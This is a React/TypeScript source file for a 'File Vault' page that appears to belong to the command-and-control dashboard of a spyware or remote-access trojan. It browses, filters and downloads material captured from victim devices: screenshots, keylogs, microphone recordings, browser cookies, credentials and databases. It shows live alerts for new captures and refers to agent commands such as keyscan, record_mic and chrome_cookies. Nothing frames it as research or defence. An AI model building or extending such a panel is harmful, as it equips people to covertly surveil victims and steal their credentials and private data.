"use client";

import { useEffect, useState, useCallback } from "react";
import { supabase, type CapturedFile, type Device, getFileUrl } from "@/lib/supabase";
import { useToast } from "@/components/toast";

const TYPE_ICON: Record<string, string> = {
  screenshot: "📸",
  keylog:     "⌨️",
  audio:      "🎙️",
  cookie:     "🍪",
  credential: "🔑",
  document:   "📄",
  database:   "🗄️",
  default:    "📦",
};

const TYPE_COLOR: Record<string, string> = {
  screenshot: "text-blue-400 border-blue-900/40",
  keylog:     "text-green-400 border-green-900/40",
  audio:      "text-purple-400 border-purple-900/40",
  cookie:     "text-amber-400 border-amber-900/40",
  credential: "text-red-400 border-red-900/40",
  document:   "text-slate-400 border-slate-700/40",
  database:   "text-cyan-400 border-cyan-900/40",
};

function fmtSize(bytes: number | null): string {
  if (!bytes) return "—";
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / 1024 / 1024).toFixed(1)} MB`;
}

export default function VaultPage() {
  const [files, setFiles] = useState<CapturedFile[]>([]);
  const [devices, setDevices] = useState<Device[]>([]);
  const [filterDevice, setFilterDevice] = useState<string>("all");
  const [filterType, setFilterType] = useState<string>("all");
  const [loading, setLoading] = useState(true);
  const [downloading, setDownloading] = useState<string | null>(null);
  const { toast } = useToast();

  const load = useCallback(async () => {
    setLoading(true);
    try {
      const [filesRes, devicesRes] = await Promise.all([
        supabase.from("files").select("*").order("captured_at", { ascending: false }).limit(500),
        supabase.from("devices").select("*").order("last_seen", { ascending: false }),
      ]);
      setFiles(filesRes.data ?? []);
      setDevices(devicesRes.data ?? []);
    } catch {
      toast("Failed to load vault data", "error");
    } finally {
      setLoading(false);
    }
  }, [toast]);

  useEffect(() => { load(); }, [load]);

  // Realtime: new file captured → auto-update
  useEffect(() => {
    const ch = supabase.channel("vault-files")
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "files" }, payload => {
        setFiles(prev => [payload.new as CapturedFile, ...prev]);
        toast(`New capture: ${(payload.new as CapturedFile).filename}`, "success");
      })
      .subscribe();
    return () => { supabase.removeChannel(ch); };
  }, [toast]);

  const download = async (file: CapturedFile) => {
    setDownloading(file.id);
    try {
      if (file.storage_path) {
        const url = await getFileUrl(file.storage_path);
        window.open(url, "_blank");
      } else {
        toast("No storage path — file not uploaded to vault", "warning");
      }
    } catch {
      toast("Download failed", "error");
    } finally {
      setDownloading(null);
    }
  };

  const filtered = files.filter(f => {
    if (filterDevice !== "all" && f.device_id !== filterDevice) return false;
    if (filterType !== "all" && f.file_type !== filterType) return false;
    return true;
  });

  const totalSize = filtered.reduce((acc, f) => acc + (f.size_bytes ?? 0), 0);

  const deviceName = (id: string) => {
    const d = devices.find(x => x.id === id);
    return d ? (d.hostname ?? d.ip ?? id.slice(0, 8)) : id.slice(0, 8);
  };

  return (
    <div className="mx-auto max-w-6xl space-y-5">
      {/* Header */}
      <div className="flex items-start justify-between border-b border-white/[0.05] pb-5">
        <div>
          <p className="text-[9px] font-semibold uppercase tracking-[0.2em] text-slate-600">Supabase Storage</p>
          <h1 className="mt-1 text-xl font-bold text-white">File Vault</h1>
          <p className="mt-1 text-[11px] text-slate-600">
            All captured files across every device — past, present, real-time · {filtered.length} files · {fmtSize(totalSize)}
          </p>
        </div>
        <button type="button" onClick={load}
          className="rounded border border-white/[0.06] px-3 py-1.5 text-[10px] uppercase tracking-wider text-slate-500 transition hover:text-slate-300">
          Refresh
        </button>
      </div>

      {/* Stats row */}
      <div className="grid grid-cols-4 gap-3">
        {[
          ["Total Files", files.length, "text-slate-300"],
          ["Screenshots", files.filter(f => f.file_type === "screenshot").length, "text-blue-400"],
          ["Credentials", files.filter(f => f.file_type === "credential" || f.file_type === "cookie").length, "text-red-400"],
          ["Audio / Keys", files.filter(f => f.file_type === "audio" || f.file_type === "keylog").length, "text-purple-400"],
        ].map(([label, val, color]) => (
          <div key={String(label)} className="rounded border border-white/[0.05] bg-white/[0.02] px-4 py-3">
            <p className="text-[8px] uppercase tracking-wider text-slate-600">{label}</p>
            <p className={`mt-1 font-mono text-2xl font-bold ${color}`}>{val}</p>
          </div>
        ))}
      </div>

      {/* Filters */}
      <div className="flex flex-wrap gap-2">
        <select value={filterDevice} onChange={e => setFilterDevice(e.target.value)}
          className="rounded border border-white/[0.06] bg-black/40 px-3 py-1.5 text-[11px] text-slate-300 focus:outline-none">
          <option value="all">All Devices</option>
          {devices.map(d => (
            <option key={d.id} value={d.id}>{d.hostname ?? d.ip ?? d.id.slice(0, 8)}</option>
          ))}
        </select>
        <select value={filterType} onChange={e => setFilterType(e.target.value)}
          className="rounded border border-white/[0.06] bg-black/40 px-3 py-1.5 text-[11px] text-slate-300 focus:outline-none">
          <option value="all">All Types</option>
          {["screenshot", "keylog", "audio", "cookie", "credential", "document", "database"].map(t => (
            <option key={t} value={t}>{t}</option>
          ))}
        </select>
      </div>

      {/* File list */}
      {loading ? (
        <div className="flex h-32 items-center justify-center">
          <span className="h-5 w-5 animate-spin rounded-full border border-slate-700 border-t-slate-400" />
        </div>
      ) : filtered.length === 0 ? (
        <div className="rounded border border-dashed border-white/[0.05] py-16 text-center">
          <p className="text-[11px] uppercase tracking-wider text-slate-700">No files captured yet</p>
          <p className="mt-1 text-[10px] text-slate-800">Use Agent Control to run screenshot, record_mic, keyscan, or chrome_cookies commands</p>
        </div>
      ) : (
        <div className="rounded border border-white/[0.05] overflow-hidden">
          <table className="w-full text-left text-[11px]">
            <thead className="border-b border-white/[0.05] bg-white/[0.02]">
              <tr>
                {["Type", "Filename", "Device", "Size", "Captured", ""].map(h => (
                  <th key={h} className="px-4 py-2.5 text-[9px] font-semibold uppercase tracking-wider text-slate-600">{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {filtered.map((f, i) => {
                const typeColor = TYPE_COLOR[f.file_type ?? ""] ?? "text-slate-400 border-slate-700/40";
                const icon = TYPE_ICON[f.file_type ?? ""] ?? TYPE_ICON.default;
                return (
                  <tr key={f.id} className={`border-b border-white/[0.03] transition hover:bg-white/[0.02] ${i % 2 === 0 ? "" : "bg-white/[0.01]"}`}>
                    <td className="px-4 py-2.5">
                      <span className={`rounded border px-1.5 py-px text-[9px] font-semibold uppercase ${typeColor}`}>
                        {icon} {f.file_type ?? "unknown"}
                      </span>
                    </td>
                    <td className="px-4 py-2.5 font-mono text-slate-300">{f.filename}</td>
                    <td className="px-4 py-2.5 text-slate-500">{deviceName(f.device_id)}</td>
                    <td className="px-4 py-2.5 font-mono text-slate-600">{fmtSize(f.size_bytes)}</td>
                    <td className="px-4 py-2.5 text-slate-600">
                      {new Date(f.captured_at).toLocaleString("en-US", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" })}
                    </td>
                    <td className="px-4 py-2.5">
                      {f.storage_path && (
                        <button type="button" onClick={() => download(f)} disabled={downloading === f.id}
                          className="rounded border border-white/[0.06] px-2.5 py-1 text-[9px] uppercase tracking-wider text-slate-500 transition hover:text-slate-300 disabled:opacity-40">
                          {downloading === f.id ? "..." : "↓ Download"}
                        </button>
                      )}
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
